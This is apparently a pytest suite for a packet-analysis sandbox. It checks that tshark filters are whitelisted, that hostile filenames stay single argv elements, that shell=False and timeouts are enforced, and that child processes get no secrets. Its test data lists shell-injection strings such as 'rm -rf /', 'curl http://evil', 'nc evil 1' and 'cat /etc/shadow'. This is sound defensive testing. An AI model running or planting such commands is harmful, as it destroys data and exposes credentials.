"""Packet sandbox + filter-whitelist tests (M5; ADR-0023 §1 — SECURITY-CRITICAL).

These are the injection-rejection tests the sandbox model hinges on:

- a malicious **filter** (shell metacharacters / unknown tokens) is rejected
  before any argv is built;
- a malicious **filename** is inert — it lands as one argv element, never
  interpolated into a shell, and ``shell=False`` is asserted on the actual
  ``subprocess.run`` call;
- ``-n`` (no name resolution / no egress) is always present;
- the hard subprocess timeout is honored.

tshark itself is mocked — no binary, no real pcap, no network.
"""

from __future__ import annotations

import io
import json
import subprocess
import threading
from typing import Any

import pytest

from app.engines.packet import (
    Conversation,
    FilterValidationError,
    PacketFindings,
    SandboxError,
    analyze_pcap,
    build_tshark_argv,
    sandbox,
    validate_capture_filter,
)

# ---------------------------------------------------------------------------
# Filter whitelist — injection rejection (SECURITY-CRITICAL)
# ---------------------------------------------------------------------------

_MALICIOUS_FILTERS = [
    "tcp port 443; rm -rf /",
    "tcp port 443 && curl http://evil",
    "tcp port 443 | nc evil 1",
    "$(reboot)",
    "`reboot`",
    "tcp port 443 > /etc/passwd",
    "tcp\nport 443",
    "host 10.0.0.1 || cat /etc/shadow",
    'host "10.0.0.1"',
    "host 10.0.0.1 -w /tmp/evil.pcap",  # cannot smuggle a second flag
    "evilfunc(1)",  # unknown bareword
    "greater -1",  # leading-dash numeric token would become a trailing flag
    "tcp and -5",  # ditto — a '-'-prefixed token must never reach getopt
    "-w/tmp/evil",  # whole filter is a dash flag
]


@pytest.mark.parametrize("bad", _MALICIOUS_FILTERS)
def test_malicious_filter_is_rejected(bad: str) -> None:
    """A filter with shell metacharacters or unknown tokens is rejected outright."""
    with pytest.raises(FilterValidationError):
        validate_capture_filter(bad)


def test_building_argv_rejects_malicious_filter_before_spawn() -> None:
    """A rejected display filter aborts in build_tshark_argv — no argv, no process."""
    with pytest.raises(FilterValidationError):
        build_tshark_argv("/data/pcaps/x.pcap", display_filter="tcp; rm -rf /")


@pytest.mark.parametrize(
    "good",
    [
        None,
        "",
        "   ",
        "tcp port 443",
        "host 10.0.0.1 and udp port 53",
        "not arp",
        "src net 10.0.0.0/8 or dst port 22",
        "ip and tcp",
    ],
)
def test_legitimate_filters_pass(good: str | None) -> None:
    """Real BPF filters pass the whitelist unchanged (stripped)."""
    result = validate_capture_filter(good)
    assert result is None or result == (good or "").strip()


def test_overlong_filter_is_rejected() -> None:
    with pytest.raises(FilterValidationError):
        validate_capture_filter("tcp " * 1000)


# ---------------------------------------------------------------------------
# argv construction — filename is inert data, never a shell command
# ---------------------------------------------------------------------------


def test_tshark_argv_is_a_list_with_no_name_resolution() -> None:
    """argv is a list, includes -r/-n/-T json; a filter becomes a -Y element."""
    argv = build_tshark_argv("/data/pcaps/cap.pcap", display_filter="tcp port 443")
    assert isinstance(argv, list)
    assert argv[0] == "tshark"
    assert "-r" in argv and "/data/pcaps/cap.pcap" in argv
    assert "-n" in argv  # no name resolution → no DNS/egress during dissection
    assert "-T" in argv and "json" in argv
    assert "-Y" in argv and "tcp port 443" in argv


def test_malicious_filename_is_a_single_inert_argv_element() -> None:
    """A filename containing shell metacharacters is one argv element, not a command."""
    evil = "/data/pcaps/x.pcap; rm -rf / #"
    argv = build_tshark_argv(evil)
    # The whole hostile string is exactly one element, immediately after -r.
    assert argv[argv.index("-r") + 1] == evil
    # It never becomes its own token / flag.
    assert "rm" not in argv
    assert ";" not in "".join(a for a in argv if a != evil)


# ---------------------------------------------------------------------------
# analyze_pcap — subprocess invoked argv-only, shell=False, with a timeout
# ---------------------------------------------------------------------------


class _Recorder:
    """Captures the subprocess.run call so the test can assert argv/shell/timeout."""

    def __init__(self, *, stdout: bytes = b"[]", returncode: int = 0) -> None:
        self.stdout = stdout
        self.returncode = returncode
        self.calls: list[dict[str, Any]] = []

    def __call__(self, argv: Any, **kwargs: Any) -> Any:
        self.calls.append({"argv": argv, "kwargs": kwargs})

        class _Completed:
            pass

        completed = _Completed()
        completed.stdout = self.stdout  # type: ignore[attr-defined]
        completed.returncode = self.returncode  # type: ignore[attr-defined]
        return completed


def test_analyze_pcap_invokes_tshark_argv_not_shell(monkeypatch: pytest.MonkeyPatch) -> None:
    """analyze_pcap runs tshark via an argv LIST with shell=False (no shell sink)."""
    recorder = _Recorder(stdout=b"[]")
    monkeypatch.setattr(subprocess, "run", recorder)

    findings = analyze_pcap("/data/pcaps/evil; rm -rf /.pcap")

    assert findings.packet_count == 0
    assert len(recorder.calls) == 1
    call = recorder.calls[0]
    # First positional arg is a LIST (argv), not a string (would be a shell line).
    assert isinstance(call["argv"], list)
    # shell is explicitly False (default), never True.
    assert call["kwargs"].get("shell") is False
    # The hostile path is one inert argv element.
    assert "/data/pcaps/evil; rm -rf /.pcap" in call["argv"]
    # A hard timeout is always passed.
    assert call["kwargs"].get("timeout") is not None


def test_analyze_pcap_rejects_malicious_filter_without_spawning(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A hostile display filter raises before subprocess.run is ever called."""
    recorder = _Recorder()
    monkeypatch.setattr(subprocess, "run", recorder)
    with pytest.raises(FilterValidationError):
        analyze_pcap("/data/pcaps/cap.pcap", display_filter="tcp; rm -rf /")
    assert recorder.calls == []  # no process spawned for a rejected filter


def test_analyze_pcap_timeout_becomes_sandbox_error(monkeypatch: pytest.MonkeyPatch) -> None:
    """A tshark child exceeding the timeout fails the task (no hang)."""

    def _raise_timeout(argv: Any, **kwargs: Any) -> Any:
        raise subprocess.TimeoutExpired(cmd=argv, timeout=kwargs.get("timeout", 1))

    monkeypatch.setattr(subprocess, "run", _raise_timeout)
    with pytest.raises(SandboxError):
        analyze_pcap("/data/pcaps/slow.pcap", timeout_seconds=0.1)


def test_analyze_pcap_nonzero_exit_becomes_sandbox_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(subprocess, "run", _Recorder(stdout=b"", returncode=2))
    with pytest.raises(SandboxError):
        analyze_pcap("/data/pcaps/bad.pcap")


def test_analyze_pcap_unparseable_output_becomes_sandbox_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(subprocess, "run", _Recorder(stdout=b"not json"))
    with pytest.raises(SandboxError):
        analyze_pcap("/data/pcaps/cap.pcap")


# ---------------------------------------------------------------------------
# run_executor — the ADR-0049 dispatcher: spawn + reap the CONFINED child
# ---------------------------------------------------------------------------

_EXECUTOR_KWARGS: dict[str, Any] = {
    "tshark_bin": "tshark",
    "timeout_seconds": 5,
    "rlimit_as_bytes": 111,
    "rlimit_fsize_bytes": 222,
    "rlimit_nofile": 33,
    "rlimit_nproc": 8,
    "deny_action": "errno",
    "max_output_bytes": 64 * 1024,
}


class _FakeStdin(io.BytesIO):
    """stdin stand-in that keeps the written request readable after ``close()``."""

    captured: bytes = b""

    def close(self) -> None:
        self.captured = self.getvalue()
        super().close()


class _FakePipe:
    """stdout stand-in: yields the queued chunks then EOF — or, when *wedge* is
    set, blocks like a real pipe held open by a stuck child until the fake process
    is killed/reaped (the event a real SIGKILL tears the pipe down with)."""

    def __init__(self, chunks: list[bytes], dead: threading.Event, *, wedge: bool = False) -> None:
        self._chunks = list(chunks)
        self._dead = dead
        self._wedge = wedge
        self.reads = 0

    def read(self, size: int = -1) -> bytes:
        self.reads += 1
        if self._chunks:
            return self._chunks.pop(0)
        if self._wedge:
            self._dead.wait(timeout=5.0)
        return b""


class _FakeProc:
    """A stand-in for the spawned executor child (no real subprocess)."""

    def __init__(
        self, *, stdout: bytes | list[bytes] = b"{}", returncode: int = 0, wedge: bool = False
    ) -> None:
        chunks = [stdout] if isinstance(stdout, bytes) else list(stdout)
        self._dead = threading.Event()
        self.stdin = _FakeStdin()
        self.stdout = _FakePipe([c for c in chunks if c], self._dead, wedge=wedge)
        self.returncode: int | None = None
        self._exit_code = returncode
        self.pid = 4242
        self.kill_called = False

    def wait(self, timeout: float | None = None) -> int:
        self._dead.set()
        if self.returncode is None:
            self.returncode = self._exit_code
        return self.returncode

    def kill(self) -> None:
        self.kill_called = True
        self._dead.set()


class _PopenRecorder:
    """Records how subprocess.Popen was called and returns a :class:`_FakeProc`."""

    def __init__(
        self, *, stdout: bytes | list[bytes] = b"{}", returncode: int = 0, wedge: bool = False
    ) -> None:
        self._stdout = stdout
        self._returncode = returncode
        self._wedge = wedge
        self.calls: list[dict[str, Any]] = []

    def __call__(self, argv: Any, **kwargs: Any) -> _FakeProc:
        proc = _FakeProc(stdout=self._stdout, returncode=self._returncode, wedge=self._wedge)
        self.calls.append({"argv": argv, "kwargs": kwargs, "proc": proc})
        return proc


def test_run_executor_spawns_confined_child_with_minimal_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The dispatcher spawns `python -m app.engines.packet.executor` with an env
    allowlist that carries NO NETOPS_* secret material, close_fds, and its own
    session — and marshals the pinned request (enforced + settings) on stdin."""
    monkeypatch.setenv("NETOPS_SECRET_KEY", "super-secret")
    monkeypatch.setenv("NETOPS_DATABASE_URL", "postgresql://netops:netops@pg/netops")
    monkeypatch.setenv("PATH", "/usr/bin")
    recorder = _PopenRecorder(stdout=PacketFindings(packet_count=7).model_dump_json().encode())
    monkeypatch.setattr(sandbox.subprocess, "Popen", recorder)

    findings = sandbox.run_executor("/data/pcaps/cap.pcap", display_filter=None, **_EXECUTOR_KWARGS)

    assert findings.packet_count == 7
    call = recorder.calls[0]
    # spawns the executor MODULE (delegates the pcap parse to the child).
    assert call["argv"] == [sandbox.sys.executable, "-m", "app.engines.packet.executor"]
    env = call["kwargs"]["env"]
    assert not any(key.startswith("NETOPS_") for key in env)  # blocker 2 (no secrets)
    assert "PATH" in env
    # blocker 2 (close_fds not disabled) + blocker 4 (own session for group kill).
    assert call["kwargs"]["close_fds"] is True
    assert call["kwargs"]["start_new_session"] is True
    # F5: the child's stderr is never buffered — it is discarded at the pipe.
    assert call["kwargs"]["stderr"] == sandbox.subprocess.DEVNULL
    # the pinned request rides on stdin: enforced true + the forwarded settings.
    request = json.loads(call["proc"].stdin.captured or b"{}")
    assert request["enforced"] is True
    assert request["pcap_path"] == "/data/pcaps/cap.pcap"
    assert request["rlimit_as_bytes"] == 111
    assert request["deny_action"] == "errno"
    assert request["tshark_bin"] == "tshark"


def test_run_executor_never_reuses_the_64mb_raw_cap(monkeypatch: pytest.MonkeyPatch) -> None:
    """The dispatcher caps the child's stdout at the TIGHT findings bound passed in
    (KB-scale), not the 64 MB raw-tshark cap — an oversized child output fails."""
    # The read-time bound (F5) kills the group; neutralize the POSIX kill so the
    # fake pid never targets a real process group on a POSIX test host.
    monkeypatch.setattr(sandbox.os, "getpgid", lambda pid: 9191, raising=False)
    monkeypatch.setattr(sandbox.os, "killpg", lambda pgid, sig: None, raising=False)
    oversized = b'{"packet_count":0,"junk":"' + b"x" * 5000 + b'"}'
    recorder = _PopenRecorder(stdout=oversized)
    monkeypatch.setattr(sandbox.subprocess, "Popen", recorder)
    kwargs = {**_EXECUTOR_KWARGS, "max_output_bytes": 1024}
    with pytest.raises(SandboxError):
        sandbox.run_executor("/data/pcaps/cap.pcap", **kwargs)


def test_run_executor_spawn_denial_maps_to_sandbox_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """F1: a spawn denial (e.g. the dispatcher seccomp filter EPERM-ing the
    setsid() that start_new_session=True issues => Popen raises PermissionError)
    maps to a SandboxError with the documented STATIC reason — the raw OS error
    text never leaks, and the task layer sees a clean packet.analysis_failed."""

    def _deny_spawn(argv: Any, **kwargs: Any) -> Any:
        raise PermissionError(1, "Operation not permitted")

    monkeypatch.setattr(sandbox.subprocess, "Popen", _deny_spawn)
    with pytest.raises(SandboxError) as excinfo:
        sandbox.run_executor("/data/pcaps/cap.pcap", **_EXECUTOR_KWARGS)
    message = str(excinfo.value)
    assert "Operation not permitted" not in message  # no raw errno/strerror text
    assert "spawn" in message  # the static documented reason


def test_spawn_and_reap_enforces_size_bound_at_read_time(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """F5: the stdout bound is enforced AT READ TIME — a child streaming past
    max_output_bytes is group-killed after the crossing chunk, never buffered
    whole into dispatcher memory."""
    killed: dict[str, int] = {}
    monkeypatch.setattr(sandbox.os, "getpgid", lambda pid: 9191, raising=False)
    monkeypatch.setattr(
        sandbox.os, "killpg", lambda pgid, sig: killed.update(pgid=pgid, sig=sig), raising=False
    )
    # A "gigabyte streamer": many 64 KiB chunks queued; the first chunk already
    # crosses the 1 KiB bound, so reading must STOP there (not drain the queue).
    chunks = [b"x" * 65536 for _ in range(10)]
    recorder = _PopenRecorder(stdout=chunks)
    monkeypatch.setattr(sandbox.subprocess, "Popen", recorder)

    with pytest.raises(SandboxError):
        sandbox._spawn_and_reap(
            ["python", "-m", "app.engines.packet.executor"],
            request_bytes=b"{}",
            timeout_seconds=5.0,
            max_output_bytes=1024,
        )

    proc = recorder.calls[0]["proc"]
    assert proc.stdout.reads == 1  # aborted on the crossing chunk, not post-hoc
    assert killed == {"pgid": 9191, "sig": sandbox._SIGKILL}  # group-killed


def test_run_executor_nonzero_exit_maps_to_sandbox_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A nonzero executor exit becomes a SandboxError whose message is the STATIC
    reason + code — never the child's stderr / raw bytes."""
    recorder = _PopenRecorder(stdout=b"", returncode=70)  # CONFINEMENT_SETUP_FAILED
    monkeypatch.setattr(sandbox.subprocess, "Popen", recorder)
    with pytest.raises(SandboxError) as excinfo:
        sandbox.run_executor("/data/pcaps/cap.pcap", **_EXECUTOR_KWARGS)
    message = str(excinfo.value)
    assert "70" in message
    assert "confinement setup failed" in message


def test_run_executor_timeout_kills_whole_process_group(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """On the outer timeout the WHOLE process group is SIGKILLed (blocker 4) so a
    wedged/popped tshark grandchild cannot outlive the bound."""
    killed: dict[str, int] = {}
    monkeypatch.setattr(sandbox.os, "getpgid", lambda pid: 9191, raising=False)
    monkeypatch.setattr(
        sandbox.os, "killpg", lambda pgid, sig: killed.update(pgid=pgid, sig=sig), raising=False
    )
    # Zero the outer margin so the wedged fake trips the deadline fast in-test.
    monkeypatch.setattr(sandbox, "_SPAWN_TIMEOUT_MARGIN_SECONDS", 0)
    recorder = _PopenRecorder(stdout=[], wedge=True)
    monkeypatch.setattr(sandbox.subprocess, "Popen", recorder)

    with pytest.raises(SandboxError):
        sandbox.run_executor(
            "/data/pcaps/slow.pcap", **{**_EXECUTOR_KWARGS, "timeout_seconds": 0.1}
        )

    assert killed == {"pgid": 9191, "sig": sandbox._SIGKILL}


# ---------------------------------------------------------------------------
# _child_env — the minimal allowlist (ADR-0049 blocker 2)
# ---------------------------------------------------------------------------


def test_child_env_excludes_netops_and_keeps_locale(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("NETOPS_SECRET_KEY", "x")
    monkeypatch.setenv("NETOPS_REDIS_URL", "redis://redis:6379/0")
    monkeypatch.setenv("PATH", "/usr/bin")
    monkeypatch.setenv("LC_ALL", "C.UTF-8")
    env = sandbox._child_env()
    assert not any(key.startswith("NETOPS_") for key in env)
    assert env["PATH"] == "/usr/bin"
    assert env.get("LC_ALL") == "C.UTF-8"


# ---------------------------------------------------------------------------
# parse_executor_findings — marshalling: bound what the (untrusted) child emits
# ---------------------------------------------------------------------------


def test_parse_executor_findings_accepts_valid_findings() -> None:
    raw = (
        PacketFindings(
            packet_count=5,
            top_talkers=[Conversation(src="10.0.0.1", dst="10.0.0.2", packets=3, bytes=240)],
        )
        .model_dump_json()
        .encode()
    )
    out = sandbox.parse_executor_findings(raw, max_bytes=64 * 1024)
    assert out.packet_count == 5
    assert out.top_talkers[0].src == "10.0.0.1"


def test_parse_executor_findings_rejects_oversized_output() -> None:
    with pytest.raises(SandboxError):
        sandbox.parse_executor_findings(b'{"packet_count":0}', max_bytes=4)


def test_parse_executor_findings_rejects_unparseable_output() -> None:
    with pytest.raises(SandboxError):
        sandbox.parse_executor_findings(b"not json {", max_bytes=64 * 1024)


def test_parse_executor_findings_rejects_overlong_list() -> None:
    """A popped child that emits an unbounded talker list is rejected (list cap)."""
    payload = {
        "packet_count": 0,
        "top_talkers": [{"src": "a", "dst": "b", "packets": 1, "bytes": 1} for _ in range(2000)],
    }
    raw = json.dumps(payload).encode()
    with pytest.raises(SandboxError):
        sandbox.parse_executor_findings(raw, max_bytes=10 * 1024 * 1024)


def test_parse_executor_findings_rejects_overlong_string() -> None:
    """A popped child that emits an unbounded string field is rejected (string cap)."""
    payload = {
        "packet_count": 0,
        "top_talkers": [{"src": "x" * 500, "dst": "b", "packets": 1, "bytes": 1}],
    }
    raw = json.dumps(payload).encode()
    with pytest.raises(SandboxError):
        sandbox.parse_executor_findings(raw, max_bytes=64 * 1024)
